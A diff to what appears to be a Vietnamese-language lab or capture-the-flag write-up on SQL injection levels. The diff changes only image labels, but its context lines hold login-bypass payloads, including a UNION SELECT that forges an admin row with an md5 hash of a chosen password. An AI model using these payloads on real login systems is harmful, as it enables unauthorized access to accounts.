@@ -5,7 +5,7 @@ username=/&password=) union select 'admin' #
 ```
 
 # Level 5:
-![](images/sql_injection_pipeline-level%205.png)
+![691](images/sql_injection_pipeline-level%205.png)
 ```php
 <?php
 function loginHandler($username, $password)
@@ -43,7 +43,7 @@ function loginHandler($username, $password)
 ```
 username=' UNION SELECT 'admin', md5('123') -- &password=123
 ```
-- Ở đây có thể thấy được password gốc là 
-![](images/real_password.png)
+- Ở đây có thể thấy được password gốc là:
+![885](images/real_password.png)
 - PoC rằng sau khi làm giả md5 hash có thể thấy password đã thay đổi theo đoạn string mà ta mong muốn
-![](images/fake_password.png)
+![886](images/fake_password.png)
